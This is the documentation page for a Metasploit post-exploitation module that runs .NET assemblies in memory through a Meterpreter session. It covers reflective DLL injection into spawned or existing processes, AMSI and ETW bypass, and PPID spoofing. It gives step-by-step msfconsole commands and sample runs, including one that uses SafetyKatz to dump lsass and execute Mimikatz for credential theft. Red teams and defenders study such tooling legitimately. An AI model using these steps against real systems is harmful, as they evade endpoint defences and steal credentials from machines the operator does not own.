# Execute .Net assembly via Meterpreter session

This module executes a .NET Assembly from a Meterpreter session

It spawns a process (or uses an existing process if provided a pid) and
uses Reflective dll injection to load HostingCLRx64.dll needed to run
.Net assembly. The unmanaged injected dll takes care of verifying if the
process has already loaded the clr, and loads it if necessary. The
version of the CLR to be loaded is determined by parsing of the assembly
provided and searching for a known signature. Then it runs the assembly
from memory.
Before loading the assembly in the context of the clr, Amsi is bypassed
using the AmsiScanBuffer patching technique.
(https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-1/)

You'll find details at [Execute assembly via Meterpreter session](https://b4rtik.blogspot.com/2018/12/execute-assembly-via-meterpreter-session.html)

## Verification Steps

  Example 1 no PID specified:

  1. Start Clone from github SeatBelt or other .Net progect
  2. Buid project with target framework 4.x or 3.5
  2. Start msfconsole
  4. Do: ```use post/windows/manage/execute_dotnet_assembly```
  5. Do: ```set SESSION sessionid```
  6. Do: ```set DOTNET_EXE /your/output/folder/file.exe```
  7. Do: ```set ARGUMENTS user```
  8. Do: ```run```
  9. You should get something like that follow

```
msf5 post(windows/manage/execute_dotnet_assembly) > run

[*] Launching notepad.exe to host CLR...
[+] Process 10628 launched.
[*] Reflectively injecting the Host DLL into 10628..
[*] Injecting Host into 10628...
[*] Host injected. Copy assembly into 10628...
[*] Assembly copied.
[*] Executing...
[*] Start reading output
[+] 
[+] 
[+]                         %&&@@@&&                                                                                  
[+]                         &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
[+]                         &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
[+] %%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
[+] #%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
[+] #%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
[+] #####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
[+] #######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
[+] ###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
[+] #####%######################  %%%..                       @////(((&%%%%%%%################                        
[+]                         &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
[+]                         &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,                                 
[+]                          #%%%%##,                                                                                 
.........
.........
.........
[+]   [*] Use the Mimikatz "dpapi::cred" module with appropriate /masterkey to decrypt
[+] 
[+] 
[+] === Checking for RDCMan Settings Files (Current User) ===
[+] 
[+] 
[+] 
[+] [*] Completed Safety Checks in 11 seconds
[+] 
[*] End output.
[+] Killing process 10628
[+] Execution finished.
[*] Post module execution completed
msf5 post(windows/manage/execute_dotnet_assembly) >
```

  Example 2 PID specified:

  1. Start Clone from github SeatBelt or other .Net progect
  2. Buid project with target framework 4.x or 3.5
  2. Start msfconsole
  4. Do: ```use post/windows/manage/execute_dotnet_assembly```
  5. Do: ```set SESSION sessionid```
  6. Do: ```set PID 8648```
  7. Do: ```set ASSEMBLYPATH /your/output/folder/SeatBelt.exe```
  8. Do: ```set ARGUMENTS user```
  9. Do: ```run```
  10. You should get something like that follow

```
msf5 post(windows/manage/execute_dotnet_assembly) > run

[*] Warning: output unavailable
[*] Hooking 8648 to host CLR...
[+] Process 8648 hooked.
[*] Reflectively injecting the Host DLL into 8648..
[*] Injecting Host into 8648...
[*] Host injected. Copy assembly into 8648...
[*] Assembly copied.
[*] Executing...
[+] Execution finished.
[*] Post module execution completed
msf5 post(windows/manage/execute_dotnet_assembly) >
```

  Example 3 perform the functionality test of the Amsi bypass.
  To perform the test it is necessary to use an assembly that runs 
  Assembly.Load to load an assembly that we know to be detected. 
  In the following example we use SafetyKatz which dynamically 
  loads Mimikatz via Assmbly.Load
  
  1. Start Clone from github SafetyKatz or other .Net progect
  2. Buid project with target framework 4.x
  2. Start msfconsole
  4. Do: ```use post/windows/manage/execute_dotnet_assembly```
  5. Do: ```set SESSION sessionid```
  6. Do: ```set PID 8648```
  7. Do: ```set DOTNET_EXE /your/output/folder/SafetyKatz.exe```
  8. Do: ```set ARGUMENTS user```
  9. Do: ```set PROCESS nslookup.exe```
  10. Do: ```set AMSIBYPASS false```
  11. Do: ```run```
  12. You should get something like that follow

```
msf5 post(windows/manage/execute_dotnet_assembly) > run

[*] Launching nslookup.exe to host CLR...
[+] Process 19904 launched.
[*] Reflectively injecting the Host DLL into 19904..
[*] Injecting Host into 19904...
[*] Host injected. Copy assembly into 19904...
[*] Assembly copied.
[*] Executing...
[*] Start reading output
[+] Server predefinito:  
[+] Address:  192.168.1.1
[+] 
[+] > 
[*] End output.
[+] Killing process 19904
[+] Execution finished.
[*] Post module execution completed
msf5 post(windows/manage/execute_dotnet_assembly) >
```

Than

  1. Do: ```set AMSIBYPASS true```
  2. Do: ```run```
  
```
msf5 post(windows/manage/execute_dotnet_assembly) > set amsibypass true
amsibypass => true
msf5 post(windows/manage/execute_dotnet_assembly) > run

[*] Launching nslookup.exe to host CLR...
[+] Process 19568 launched.
[*] Reflectively injecting the Host DLL into 19568..
[*] Injecting Host into 19568...
[*] Host injected. Copy assembly into 19568...
[*] Assembly copied.
[*] Executing...
[*] Start reading output
[+] Server predefinito:  
[+] Address:  192.168.1.1
[+] 
[+] > 
[+] [*] Dumping lsass (744) to C:\WINDOWS\Temp\debug.bin
[+] [+] Dump successful!
[+] 
[+] [*] Executing loaded Mimikatz PE
[+] 
[+]   .#####.   mimikatz 2.1.1 (x64) built on Jul  7 2018 03:36:26 - lil!
[+]  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
[+]  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
[+]  ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
[+]  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
[+]   '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
[+] 
[+] mimikatz # Opening : 'C:\Windows\Temp\debug.bin' file for minidump...
[+] ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
[+] Opening : 'C:\Windows\Temp\debug.bin' file for minidump...
[+] ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)
[+] 
[+] mimikatz # deleting C:\Windows\Temp\debug.bin
[+] Execution started
[+] ICorRuntimeHost->GetDefaultDomain(...) succeeded
[*] End output.
[+] Killing process 19568
[+] Execution finished.
[*] Post module execution completed
msf5 post(windows/manage/execute_dotnet_assembly) >
```

## Options

```
Module options (post/windows/manage/execute_dotnet_assembly):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   AMSIBYPASS      true             yes       Enable Amsi bypass
   ARGUMENTS                        no        Command line arguments
   DOTNET_EXE                       yes       Assembly file name
   ETWBYPASS       true             yes       Enable Etw bypass
   PID             0                no        Pid  to inject
   PPID            0                no        Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)
   PROCESS         notepad.exe      no        Process to spawn
   SESSION                          yes       The session to run this module on.
   USETHREADTOKEN  true             no        Spawn process with thread impersonation
   WAIT            10               no        Time in seconds to wait


```

AMSIBYPASS

Enable or Disable Amsi bypass. This parameter is necessary due to the
technique used. It is possible that subsequent updates will make the
bypass unstable which could result in a crash. By setting the parameter
to false the module continues to work.

ARGUMENTS

Command line arguments. The signature of the Main method must match with
the parameters that have been set in the module, for example:

If the property ARGUMENTS is set to "antani sblinda destra" the main
method should be "static void main (string [] args)"<br />
If the property ARGUMENTS is set to "" the main method should be "static
void main ()"

DOTNET_EXE 

Dotnet Executable to execute

PID

Pid to inject. If different from 0 the module does not create a new
process but uses the existing process identified by the PID parameter.

PROCESS

Process to spawn when PID is equal to 0.

SESSION

The session to run this module on. Must be meterpreter session

WAIT

Time in seconds to wait before starting to read the output.

